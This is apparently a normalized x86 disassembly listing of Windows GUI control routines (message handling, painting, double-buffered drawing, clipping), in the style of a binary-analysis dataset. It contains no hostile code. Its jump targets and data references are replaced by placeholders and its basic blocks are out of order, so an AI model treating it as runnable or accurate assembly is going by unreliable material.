mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4758a4
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb047
mov eax ebx
call sub_472314
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x200
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x4 ]
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xac ]
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
sub eax 0x63
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x77
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4767cc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0xa ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_47085c
call sub_46d884
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x4 ]
test al 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_472440
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
test al al
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ebx [ rw-data ]
lea eax [ ebp - 0x10 ]
mov dl 0x1
call sub_46f174
mov ebx eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb014
call sub_472314
jmp r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x24c ]
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call DefWindowProcW
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
mov [ ebp - 0x30 ] 0x2
mov eax [ ebp - 0x4 ]
call sub_479ce0
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xffffffff
mov [ ebp - 0x34 ] 0x10
lea eax [ ebp - 0x34 ]
push eax
call _TrackMouseEvent
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_472314
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
cmp eax [ rw-data ]
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
xor ecx ecx
mov edx 0xb014
call sub_472314
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24c ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov [ edx + 0x24c ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_43c510
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_43c22c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
xor ecx ecx
mov edx 0xb013
call sub_472314
sub_476f74
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x258 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_472728
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call __imp_SendMessageW
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x34 ]
call sub_472314
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x64 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x1c0 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x1c0 ]
call sub_44cd7c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4709ec
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x258 ]
push eax
mov eax [ esi + 0x254 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_47707c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_46d414
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_472314
mov [ esi + 0xc ] eax
mov bl 0x1
sub_4770b0
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_47720f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call BeginPaint
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4771d2
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1dc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
jmp r-xdata
dec edi
je r-xdata
inc ebx
xor esi esi
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_477258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477216
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call EndPaint
inc esi
dec ebx
jne r-xdata
test [ eax + 0x55 ] 0x8
jne r-xdata
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1dc ]
mov edx esi
call sub_4305a0
cmp [ eax + 0x59 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov ecx [ eax + 0x44 ]
add ecx [ eax + 0x4c ]
push ecx
mov edx [ eax + 0x40 ]
mov ecx edx
add ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x44 ]
push ecx
push edx
mov eax [ ebp - 0x10 ]
push eax
call ExcludeClipRect
mov edi eax
cmp edi 0x1
je r-xdata
sub_477220
push esi
add esp 0xfffffff0
mov esi eax
test [ esi + 0x56 ] 0x1
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop esi
retn
sub_477258
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ec ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1dc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1eb ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
test eax eax
je r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1dc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx ebx
call sub_430608
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1dc ]
mov edx [ ebp - 0xc ]
call sub_4305a0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
dec edi
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
mov edx [ ebp - 0xc ]
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x1e9 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0x44 ]
mov eax esi
mov edx [ ebp - 0x18 ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax + 0x40 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
add ecx [ eax + 0x48 ]
mov edx esi
mov eax ebx
call sub_40ab90
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x59 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_44bb2c
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_40ab90
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax 0xff000014
call sub_44bb2c
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_40ab90
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_477406
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x8 ]
call sub_46f238
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x18 ]
call sub_472314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x18 ]
or [ eax + 0x54 ] 0x80
test [ ebx + 0x55 ] 0x8
jne r-xdata
sub_477538
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44cf34
xor eax eax
push ebp
push sub_477588
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44df24
mov edx eax
mov ecx esi
mov eax ebx
call sub_477644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47758f
mov eax [ ebp - 0x4 ]
call sub_44d038
retn
sub_477598
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47762c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
push eax
call ExcludeClipRect
call sub_485c78
lea ecx [ ebp - 0x18 ]
mov dl 0x2
call sub_486220
mov eax [ ebp - 0x8 ]
push eax
call sub_485c78
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_485f18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477633
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call RestoreDC
retn
sub_477644
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_47787e
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_46f238
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor esi esi
xor ebx ebx
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test eax 0x800000
je r-xdata
mov ebx 0xa
mov esi 0x200f
jmp r-xdata
cmp ebx 0xa
jne r-xdata
mov ebx 0x3
mov esi 0xa00f
test esi esi
je r-xdata
call sub_485c78
call sub_485d84
test al al
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x4 ]
call sub_472314
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
push esi
push ebx
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_46f238
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477885
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_485c0c
test al al
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_477598
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] edx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_477598
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_477644
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_46f238
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
mov edx esi
call sub_4305a0
cmp [ eax + 0x59 ] 0x0
je r-xdata
sub_47789c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x260 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4770b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_475884
test eax eax
jne r-xdata
call sub_4406d0
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call BeginPaint
mov esi eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
push eax
push esi
call CreateCompatibleBitmap
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_477aec
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
call CreateCompatibleDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_477ab3
push [ fs : ecx ]
mov [ fs : ecx ] esp
push 0x0
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWindowOrgEx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_472314
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47789c
xor eax eax
mov [ ebx + 0x4 ] eax
push 0xcc0020
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x40 ]
sub ecx edx
push ecx
mov ecx [ ebp - 0x44 ]
sub ecx eax
push ecx
push edx
push eax
push esi
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477aba
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
retn
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call BeginPaint
mov esi eax
xor edx edx
push ebp
push sub_4779d0
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x2
lea eax [ ebp - 0x4c ]
push eax
push esi
call j_sub_43f97a
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call EndPaint
retn
xor edx edx
push ebp
push sub_4779a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x4
mov ecx [ ebp - 0x8 ]
mov edx 0x318
mov eax [ ebp - 0x4 ]
call sub_472314
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push 0xffffffff
mov eax [ ebp - 0x14 ]
push eax
call j_sub_43f98e
retn
lea eax [ ebp - 0x4c ]
push 0xff
push eax
mov eax [ ebp - 0x14 ]
push eax
call j_sub_43f9a2
sub_477aba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call EndPaint
mov eax [ ebp - 0x8 ]
push eax
call DeleteDC
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_477afc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477b1c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477b90
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477bb0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477bd0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477bf4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477c18
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477c3c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_47707c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_477c5c
push ebx
push esi
mov esi edx
mov ebx eax
